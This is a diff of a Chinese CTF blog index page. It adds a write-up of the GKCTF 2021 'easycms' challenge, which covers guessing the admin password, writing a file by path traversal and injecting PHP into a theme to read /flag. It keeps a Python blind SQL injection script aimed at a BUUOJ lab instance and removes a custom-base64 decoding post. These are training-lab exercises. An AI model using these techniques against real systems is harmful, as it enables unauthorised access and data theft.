@@ -113,7 +113,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">118</span>
+          <span class="site-state-item-count">119</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -131,6 +131,118 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GKCTF-2021-easycms/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="why">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="why">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | why">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GKCTF-2021-easycms/" class="post-title-link" itemprop="url">[GKCTF 2021]easycms</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-06-21 19:11:20 / 修改时间：20:05:54" itemprop="dateCreated datePublished" datetime="2024-06-21T19:11:20+08:00">2024-06-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211945743.png" alt="image-20240621194533640"></p>
+<p>给我整懵了，我差点以为我点到了其它网站了。</p>
+<p>看了眼提示，弱密码五位</p>
+<p>在界面四处找了找，发现没有登陆界面，所以扫文件</p>
+<p>发现admin.php</p>
+<p>所以访问</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211948154.png" alt="image-20240621194846104"></p>
+<p>弱密码，可以慢慢试，也可以bp</p>
+<p>但是文件名叫admin诶</p>
+<p>尝试，最后发现是</p>
+<p>admin&#x2F;12345</p>
+<p>登录成功</p>
+<p>之后在界面里逛逛，发现了一个可以上传文件的地方</p>
+<p>在设计-&gt;主题-&gt;导入主题</p>
+<p>但是</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211950028.png" alt="image-20240621195039994"></p>
+<p>所以，我们要找地方，创建文件</p>
+<p>所以就是要找可以创建或者上传文件的地方对吧</p>
+<p>按照这个思路，我们可以找到</p>
+<p>设计-&gt;组件-&gt;素材库</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211952714.png" alt="image-20240621195220695"></p>
+<p>随便上传一个txt上去</p>
+<p>之后进行编辑</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211953189.png" alt="image-20240621195311156"></p>
+<p>现在的界面的话要更改存储路径来创建一个新文件</p>
+<p>根据上文的文件，猜测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../system/tmp/tfeh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212001660.png" alt="image-20240621200101620"></p>
+<p>也就是说，我们现在有这个文件了</p>
+<p>所以我们开始猜测怎么爆flag出来</p>
+<p>根据上面的，我们猜测这个flag应该和主题有关</p>
+<p>所以我们去主题里面看看</p>
+<p>随便选择一个主题</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212004631.png" alt="image-20240621200410599"></p>
+<p>在这一行里面我们都能看到一个</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212004630.png" alt="image-20240621200438587"></p>
+<p>那就很简单了，php源码搞一手</p>
+<p>我直接cat &#x2F;flag了</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212005229.png" alt="image-20240621200508201"></p>
+<p>之后返回主题，或者在右上角的可视化编辑里面看到页面</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212005045.png" alt="image-20240621200540019"></p>
+<p>我是放在友链里，在其它板块也是可以的</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -951,83 +1063,6 @@
 <p>payload则是为了闭合引号</p>
 <p>所以写脚本爆flag</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">def search():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://fd61fced-c80d-4436-aa4e-b3aa75cf7fae.node5.buuoj.cn:81/&#x27;</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    for i in range(100):</span><br><span class="line">        sleep(0.3)#不加sleep就429了QAQ</span><br><span class="line">        data1 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot; : &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        data2 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;,r2.text)</span><br><span class="line">        res1 = re.search(r&#x27;\d+&#x27;, res.group())</span><br><span class="line">        flag = flag+chr(int(res1.group()))</span><br><span class="line">        print(flag)</span><br><span class="line">    print(&quot;final:&quot;+flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    search()</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/16/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/BJDCTF2020-%E8%BF%99%E6%98%AFbase/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="why">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="why">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | why">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/06/16/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/BJDCTF2020-%E8%BF%99%E6%98%AFbase/" class="post-title-link" itemprop="url">[BJDCTF2020]这是base??</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-06-16 21:44:39 / 修改时间：21:48:56" itemprop="dateCreated datePublished" datetime="2024-06-16T21:44:39+08:00">2024-06-16</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict:&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;</span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br></pre></td></tr></table></figure>
-
-<p>很简单的思路</p>
-<p>就是将密文对照着字典重新编辑一遍</p>
-<p>也就是找到每个字母对应的数字，将其替换为base64表的一般字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">dict=&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;</span><br><span class="line"></span><br><span class="line">a = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;    #标准表</span><br><span class="line"></span><br><span class="line">c=&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span><br><span class="line"></span><br><span class="line">ds=&#x27;&#x27;  #把dict转换成字符串方便处理</span><br><span class="line">for i in range(65):</span><br><span class="line">    ds+=dict[i]</span><br><span class="line"></span><br><span class="line">l=[]</span><br><span class="line">for i in range(len(c)):</span><br><span class="line">    l.append(ds.index(c[i]))  #无论换不换表，base64变换本身产生的6位二进制数对应的十进制数是不变的，这里就是找到密文c的每个字符在dict表中键值</span><br><span class="line"></span><br><span class="line">#print(l)  #l中存的是索引值（下标数字）</span><br><span class="line"></span><br><span class="line">m1=&#x27;&#x27;</span><br><span class="line">for ll in l:</span><br><span class="line">    m1+=a[ll]  #找到l中所存的每个数字在标准的base64加密表中所对应的字符</span><br><span class="line">print(m1)  #m1是标准base64表编码结果</span><br><span class="line"></span><br><span class="line">m2=base64.b64decode(m1)  #直接调用函数恢复出明文</span><br><span class="line">print(m2)</span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
 
